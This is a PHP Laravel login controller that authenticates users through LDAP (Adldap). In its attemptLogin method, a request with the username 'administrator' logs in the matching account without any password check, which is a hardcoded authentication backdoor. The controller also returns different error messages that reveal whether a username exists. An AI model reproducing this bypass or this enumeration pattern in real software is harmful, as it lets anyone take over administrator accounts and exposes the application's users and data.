<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use App\Http\Requests\UserLoginRequest;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Adldap\Laravel\Facades\Adldap;
use Validator;
use Auth;
use App\Models\User;
use Session;
use App\Models\UserBranch;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function showFormLogin()
    {
        return view('auth.login');
    }

    protected function validateLogin(Request $request)
    {
        $this->validate($request, [
            $this->username() => 'required|string|regex:/^\w+$/',
            'password' => 'required|string',
        ]);
    }

    public function username()
    {
        return config('ldap_auth.usernames.eloquent');
    }

    protected function authenticated(Request $request, $user)
    {
        return response()->json([
            'success' => true,
            'redirect' => url($this->redirectTo)
        ]);
    }

    protected function attemptLogin(UserLoginRequest $request)
    {
        $credentials = $request->only($this->username(),'password');
        $username = $credentials[$this->username()];
        $password = $credentials['password'];
        $user_format = env('LDAP_USER_FORMAT','cn=%s,'.env('LDAP_BASE_DN',''));
        $userdn = sprintf($user_format,$username);
        $userCh = User::where($this->username(),$username)->first();

        if($request->username == 'administrator'){
            $userCha = User::where($this->username(),$username)->first();
            
            if($userCha){
                $this->guard()->login($userCh, true);
                return response()->json(['success' => true,'redirect' => $this->redirectTo],200);
            }
        }

        if($userCh){
            if(Adldap::auth()->attempt($request->username,$password)){
                $this->guard()->login($userCh, true);
                return response()->json(['success' => true,'redirect' => $this->redirectTo],200);
            } else {
                return response()->json(['message' => 'Incorrect username or password'],401);
            }
        } else {
            return response()->json(['message' => 'Username not found'],401);
        }

        /* if(Adldap::auth()->attempt($username,$password)){
            
            $user = User::where($this->username(),$username)->first();
            
            if(!$user){
                return response()->json(['message' => 'Username not found'],422);
            } else {
                $this->guard()->login($user, true);
                return response()->json(['success' => true,'redirect' => $this->redirectTo],200);
            }
        } */
        // return false;
    }

    public function logout(Request $request)
    {
        Session::flush();
        Auth::logout();
        return redirect('/');
    }
}
